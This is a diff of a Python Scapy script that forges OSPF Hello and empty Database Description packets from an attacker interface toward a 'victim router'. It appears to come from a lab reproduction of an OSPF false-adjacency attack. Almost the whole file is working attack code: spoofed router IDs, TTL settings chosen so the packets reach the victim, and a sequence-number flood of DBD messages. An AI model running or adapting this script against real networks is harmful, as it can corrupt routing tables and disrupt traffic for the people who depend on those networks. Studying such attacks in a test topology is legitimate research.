@@ -10,6 +10,7 @@ from subprocess import Popen, PIPE
 from scapy.all import *
 from random import randint
 from time import sleep
+from utils import log, log2
 
 
 load_contrib("ospf")
@@ -18,22 +19,27 @@ load_contrib("ospf")
 SOURCE_ADDRESS = '10.0.1.3'
 DESTINATION_ADDRESS = '10.0.1.2'
 HELLO_DESTINATION_ADDRESS = '224.0.0.5'
+
 HELLO_INTERVAL = 10
 DEAD_INTERVAL = 40
-TTL = 64
+TTL = 64 # set to a value greater than 1 in order to be forwarded towards the victim router
+
 OUTPUT_INTERFACE = 'atk1-eth0'
 
 eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]
 
 
-def log(s, col="green"):
-	print T.colored(s, col)
-
-
-def send_hello_packet(srcMAC, dstMAC, srcIP, dstIP):
+def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
-	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
+	ttl = None
+
+	if dstIP == HELLO_DESTINATION_ADDRESS:
+		ttl = 1
+	else:
+		ttl = TTL
+
+	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
 
 	ospf_header = OSPF_Hdr(\
 		src='2.2.2.3')
@@ -41,19 +47,20 @@ def send_hello_packet(srcMAC, dstMAC, srcIP, dstIP):
 	ospf_payload = OSPF_Hello(\
 		hellointerval=HELLO_INTERVAL, \
 		deadinterval=DEAD_INTERVAL,\
-		mask='0.0.0.0',\
+		mask='255.255.255.0',\
 		neighbors=['2.2.2.2', '1.1.1.1'],\
-		#router='10.0.1.3',\
-		#backup='10.0.1.2',\
-		options=2L)
+		router='10.0.1.3',\
+		backup='10.0.1.2',\
+		options=2L) 
+		# 2L = External Routing
 
 	frame = eth_header/ip_header/ospf_header/ospf_payload
 	frame.show()
 
-	sendp(frame, iface=OUTPUT_INTERFACE)
+	sendp(frame, iface=iface)
 
 
-def send_empty_dbd_messages(srcMAC, dstMAC, srcIP, dstIP, n, interval):
+def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, n, interval):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
 	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
@@ -66,22 +73,24 @@ def send_empty_dbd_messages(srcMAC, dstMAC, srcIP, dstIP, n, interval):
 
 	ospf_payload = OSPF_DBDesc(\
 		dbdescr=7L,\
-		options=2L)
+		options=2L) 
+		# 7L = I, M, MS => Init, More, Master
+		# 2L = E => External Routing
 
 	frame = eth_header/ip_header/ospf_header/ospf_payload
 	frame.show()
 
 	for i in xrange(0, n):
-		print 'sending %d-th dbd message with seqNum %d at %s' % (i+1, seqNum + i, datetime.datetime.now().strftime("%H:%M:%S"))
+		log('sending %d-th dbd message with seqNum %d' % (i+1, seqNum + i), 'red')
 
 		sleep(interval)
 
 		frame.payload.payload.payload.ddseq = seqNum + i
+		sendp(frame, iface=iface)
 
-		sendp(frame, iface=OUTPUT_INTERFACE)
 
-
-def send_hello_messages(srcMAC, dstMAC, srcIP, dstIP, interval):
+"""
+def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, interval):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
 	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
@@ -99,76 +108,51 @@ def send_hello_messages(srcMAC, dstMAC, srcIP, dstIP, interval):
 		options=2L)
 
 	frame = eth_header/ip_header/ospf_header/ospf_payload
-	frame.show()
+	frame.show()	
 
 	i = 0
 
 	while True:
-		print 'sending %d-th hello message at %s' % (i+1, datetime.datetime.now().strftime("%H:%M:%S"))
+		log('sending %d-th hello message' % i+1, 'red')
 
 		sleep(interval)
 
-		sendp(frame, iface=OUTPUT_INTERFACE)
-
-
-def retrieve_mac_address(iface, ip_address):
-	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)
-
-	mac_address = None
-
-	for row in iter(p.stdout.readline, b''):
-		mac_address = extract_mac_address(row, ip_address)
-
-		if mac_address != None:
-			p.kill()
-
-			break
-
-	return mac_address
-
-
-def extract_mac_address(row, ip_address):
-	values = row.split(' ')
-
-	if ip_address in values[9]:
-		return values[1].replace(',','')
-
-	if ip_address in values[11]:
-		return values[3].replace(',','')
-
-	return None
-
-
-def retrieve_atk1_mac_address(iface):
-	p = Popen(('ifconfig'), stdout=PIPE)
-
-	for row in iter(p.stdout.readline, b''):
-		if iface in row:
-			values = row.split(' ')
-
-			p.kill()
-
-			return values[5]
-
-	p.kill()
-
-	return None
+		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP)
+"""
 
 
 def main():
-	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
-	assert src_mac_address is not None
-	print 'source MAC address', src_mac_address
+	iface = sys.argv[1]
+	src_mac_address = sys.argv[2]
+	dst_mac_address = sys.argv[3]
 
-	dst_mac_address = retrieve_mac_address('atk1-eth0', '10.0.3.1')
+	assert iface is not None
+	assert src_mac_address is not None
 	assert dst_mac_address is not None
+
+	print
+	print 'interface', iface
+	print 'source MAC address', src_mac_address
 	print 'destination MAC address', dst_mac_address
 
-	send_hello_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)
+	# FIXME
+	# R3 does not forward Hello packet
 
-	send_empty_dbd_messages(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)
+	# test1
+	#send_hello_packet(OUTPUT_INTERFACE, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)
 
-	send_hello_messages(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)
+	# test2
+	# HELLO_DESTINATION_ADDRESS => TTL != 1 for a packet sent to the Local Network Control Block
+	send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)
+
+	# TODO
+	# R1 responds with updated HELLO
+	# check following messages
+	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)
+
+	#send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)
+
+	log('attack terminated', 'red')
 
 
 if __name__ == "__main__":
